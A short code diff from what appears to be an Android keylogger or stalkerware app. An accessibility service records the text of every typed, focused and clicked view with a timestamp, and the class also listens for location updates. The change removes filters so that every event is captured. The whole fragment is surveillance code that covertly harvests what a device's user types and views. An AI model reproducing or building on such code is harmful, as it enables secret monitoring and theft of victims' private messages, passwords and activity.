@@ -56,24 +56,18 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
 
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                 val data = event.text.toString()
-                if (data != "[]") {
                     interactor.setDataKey("${getDateTime()} |(TEXT)| $data")
                     i(TAG, "${getDateTime()} |(TEXT)| $data")
-                }
             }
             AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                 val data = event.text.toString()
-                if (data != "[]") {
                     interactor.setDataKey("${getDateTime()} |(FOCUSED)| $data")
                     i(TAG, "${getDateTime()} |(FOCUSED)| $data")
-                }
             }
             AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                 val data = event.text.toString()
-                if (data != "[]") {
                     interactor.setDataKey("${getDateTime()} |(CLICKED)| $data")
                     i(TAG, "${getDateTime()} |(CLICKED)| $data")
-                }
             }
         }
 
